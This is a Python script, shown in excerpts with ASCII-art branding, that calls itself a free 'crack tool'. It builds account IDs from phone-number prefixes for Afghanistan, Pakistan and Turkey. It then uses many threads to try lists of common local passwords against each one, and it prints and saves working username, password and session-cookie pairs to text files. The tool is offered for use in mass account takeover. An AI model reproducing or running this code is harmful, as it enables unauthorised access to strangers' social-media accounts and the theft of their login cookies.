#---------------------[OMAR-SADAT]---------------------#
#OMAR AND USBEK IS THE BEST OF THE CRACK TOOLS SYESTUM#
...
\033░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝         
\033[1;34m════════════════════════════════════════════════
        \033[1;36mCREATED BY   :  OMAR SADAT 
        \033[1;33mSTYLE        :  ALWAYS HAPPY
        \033[1;35mSYSTEM       :  DATA & WIFI
        \033[1;32mFACEBOK      :  OMAR/SADAT
        \033[1;34mGITHUB       :  OMAR-SADAT1
        \033[1;36mTOOLS STATUS :  FREE
        \033[1;32mVERSION      :  0.0
\033[1;34m════════════════════════════════════════════════\33[1;37m""")
...
def india():
	os.system('clear')
	print(logo)
	print('[1] turkishCRACK _M 1')
	print('[2] turkish CRACK _M 2')
	print('[3]\x1b[1;95m BACK MENU')
	lines()
	riaz1 = input('[+] SELECT OPTION : ')
	if riaz1 =='1':
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print(' CHOOSE CODE : 078, 079, 070, 077, 074')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','500500','10002000','50006000','kabul123','Afghan12345','۱۲۳۴۵۶۷۸۹']
...
def m2():
    ...
    os.system('clear')
    print(logo)
    print(' CHOOSE CODE : 9378, 9379, 9377, 9370, 074')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','50005000']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','Afghanistan','kabul123','۱۰۰۲۰۰','۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','400500','50005000']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'pakistan','khankhan','khan1234','malik123','Ahmad123','karachi123','pikhawar']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'turkish','turk123','123456','turkiye123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[BMT-OK] '+uid+' | '+ps+' \n\033[1;33m COOKIE = \033[1;35m'+coki+  '  ''  \033[0;97m');print(53*'\033[1;37m═')
                open('BMT-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m[BMT] %s| [OK:- %s] \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
